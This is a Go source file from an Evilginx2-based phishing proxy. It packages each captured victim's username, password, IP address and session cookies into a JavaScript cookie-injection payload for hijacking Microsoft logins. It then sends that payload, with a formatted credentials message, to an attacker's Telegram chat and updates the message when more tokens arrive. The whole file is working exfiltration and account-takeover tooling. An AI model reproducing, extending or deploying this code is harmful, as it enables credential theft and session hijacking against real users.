package core

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"math/rand"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

type exportCookie struct {
	Path           string `json:"path"`
	Domain         string `json:"domain"`
	ExpirationDate int64  `json:"expirationDate"`
	Value          string `json:"value"`
	Name           string `json:"name"`
	HttpOnly       bool   `json:"httpOnly"`
	HostOnly       bool   `json:"hostOnly"`
	Secure         bool   `json:"secure"`
	Session        bool   `json:"session"`
}

var telegramMessageIDs = make(map[string]int)
var telegramMu sync.Mutex

func sessionHasNotifyableTokens(s *database.Session) bool {
	if s == nil {
		return false
	}
	return len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0
}

func sessionHasNotifyableCredentials(s *database.Session) bool {
	if s == nil {
		return false
	}
	return s.Username != "" || s.Password != ""
}

func sessionShouldNotifyTelegram(s *database.Session) bool {
	return sessionHasNotifyableTokens(s) || sessionHasNotifyableCredentials(s)
}

func cookieTokensToExportJSON(tokens map[string]map[string]*database.CookieToken) (string, error) {
	var cookies []*exportCookie
	for domain, tmap := range tokens {
		for k, v := range tmap {
			if v == nil || v.Value == "" {
				continue
			}
			c := &exportCookie{
				Path:           v.Path,
				Domain:         domain,
				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
				Value:          v.Value,
				Name:           k,
				HttpOnly:       v.HttpOnly,
				Secure:         false,
				Session:        false,
			}
			if strings.HasPrefix(k, "__Host-") || strings.HasPrefix(k, "__Secure-") {
				c.Secure = true
			}
			if len(domain) > 0 && domain[0] == '.' {
				c.HostOnly = false
			} else {
				c.HostOnly = true
			}
			if c.Path == "" {
				c.Path = "/"
			}
			cookies = append(cookies, c)
		}
	}
	if len(cookies) == 0 {
		return "[]", nil
	}
	out, err := json.Marshal(cookies)
	if err != nil {
		return "", err
	}
	return string(out), nil
}

func jsSafeBacktick(s string) string {
	s = strings.ReplaceAll(s, `\`, `\\`)
	s = strings.ReplaceAll(s, "`", "\\`")
	return s
}

func generateRandomString() string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, 10)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

func createTxtFileFromSession(s *database.Session) (string, error) {
	if s == nil {
		return "", fmt.Errorf("session is nil")
	}

	var txtFileName string
	if s.Username != "" {
		sanitized := strings.NewReplacer("@", "_at_", "/", "_", "\\", "_", ":", "_", "*", "_", "?", "_", "\"", "_", "<", "_", ">", "_", "|", "_").Replace(s.Username)
		txtFileName = sanitized + ".txt"
	} else {
		txtFileName = generateRandomString() + ".txt"
	}
	txtFilePath := filepath.Join(os.TempDir(), txtFileName)

	cookiesJSON, err := cookieTokensToExportJSON(s.CookieTokens)
	if err != nil {
		return "", err
	}

	redirectURL := s.LandingURL
	if redirectURL == "" {
		redirectURL = "https://login.microsoftonline.com"
	}

	var payload strings.Builder
	payload.WriteString(fmt.Sprintf("let ipaddress = `%s`;\n", jsSafeBacktick(s.RemoteAddr)))
	payload.WriteString(fmt.Sprintf("let email = `%s`;\n", jsSafeBacktick(s.Username)))
	payload.WriteString(fmt.Sprintf("let password = `%s`;\n", jsSafeBacktick(s.Password)))

	cookieCount := countCookieTokens(s.CookieTokens)
	if cookieCount > 0 {
		cookiesB64 := base64.StdEncoding.EncodeToString([]byte(cookiesJSON))
		redirectB64 := base64.StdEncoding.EncodeToString([]byte(redirectURL))
		payload.WriteString(fmt.Sprintf(
			"!function(){let e=JSON.parse(atob('%s'));\n"+
				"for(let o of e)document.cookie=`${o.name}=${o.value};Max-Age=31536000;${o.path?`path=${o.path};`:\"\"}${o.domain?`${o.path?\"\":\"path=/\"}domain=${o.domain};`:\"\"}Secure;SameSite=None`;\n"+
				"window.location.href=atob('%s')}();",
			cookiesB64,
			redirectB64,
		))
	} else {
		payload.WriteString("// No session cookies captured (wrong password, MFA, or login not complete).\n")
	}

	if len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0 {
		extra, _ := json.Marshal(map[string]interface{}{
			"body_tokens": s.BodyTokens,
			"http_tokens": s.HttpTokens,
			"custom":      s.Custom,
		})
		payload.WriteString("\n// additional tokens\n")
		payload.Write(extra)
		payload.WriteString("\n")
	}

	if err := os.WriteFile(txtFilePath, []byte(payload.String()), 0600); err != nil {
		return "", fmt.Errorf("failed to write file: %v", err)
	}
	return txtFilePath, nil
}

func formatSessionMessage(s *database.Session) string {
	cookieCount := countCookieTokens(s.CookieTokens)
	footer := "📦 Session cookies are in the attached txt file."
	if cookieCount == 0 {
		footer = "⚠️ Credentials only — no session cookies (wrong password, MFA, or login not finished)."
	}
	return fmt.Sprintf("✨ Session Information ✨\n\n"+
		"👤 Username:      ➖ %s\n"+
		"🔑 Password:      ➖ %s\n"+
		"🌐 Landing URL:   ➖ %s\n \n"+
		"🖥️ User Agent:    ➖ %s\n"+
		"🌍 Remote Address:➖ %s\n"+
		"🕒 Create Time:   ➖ %d\n"+
		"🕔 Update Time:   ➖ %d\n"+
		"🍪 Cookies:       ➖ %d\n"+
		"\n"+
		"%s\n",
		s.Username,
		s.Password,
		s.LandingURL,
		s.UserAgent,
		s.RemoteAddr,
		s.CreateTime,
		s.UpdateTime,
		cookieCount,
		footer,
	)
}

func countCookieTokens(tokens map[string]map[string]*database.CookieToken) int {
	n := 0
	for _, tmap := range tokens {
		for _, v := range tmap {
			if v != nil && v.Value != "" {
				n++
			}
		}
	}
	return n
}

func telegramMessageIDForSession(s *database.Session) (int, bool) {
	telegramMu.Lock()
	defer telegramMu.Unlock()
	if id, ok := telegramMessageIDs[s.SessionId]; ok {
		return id, true
	}
	if s.Tmsgid != "" {
		if id, err := strconv.Atoi(s.Tmsgid); err == nil && id > 0 {
			telegramMessageIDs[s.SessionId] = id
			return id, true
		}
	}
	return 0, false
}

func setTelegramMessageID(sid string, messageID int, db *database.Database) {
	telegramMu.Lock()
	telegramMessageIDs[sid] = messageID
	telegramMu.Unlock()
	if db != nil {
		_ = db.SetSessionTmsgid(sid, strconv.Itoa(messageID))
	}
}

// NotifyTelegramSession loads the session from the database and sends or updates Telegram notification.
// Notifies on credentials alone (e.g. wrong password) and again when cookies are captured later.
func NotifyTelegramSession(db *database.Database, sid string, chatid string, teletoken string) {
	if db == nil || sid == "" || chatid == "" || teletoken == "" {
		return
	}

	s, err := db.GetSessionBySid(sid)
	if err != nil {
		log.Error("telegram: session %s: %v", sid, err)
		return
	}
	if !sessionShouldNotifyTelegram(s) {
		log.Debug("telegram: session %s has nothing to send yet, skipping", sid)
		return
	}

	txtFilePath, err := createTxtFileFromSession(s)
	if err != nil {
		log.Error("telegram: create txt: %v", err)
		return
	}
	defer os.Remove(txtFilePath)

	message := formatSessionMessage(s)

	if messageID, ok := telegramMessageIDForSession(s); ok {
		if err := editMessageFile(chatid, teletoken, messageID, txtFilePath, message); err != nil {
			log.Error("telegram: edit message: %v", err)
		}
		return
	}

	messageID, err := sendTelegramNotification(chatid, teletoken, message, txtFilePath)
	if err != nil {
		log.Error("telegram: send: %v", err)
		return
	}
	setTelegramMessageID(sid, messageID, db)
}
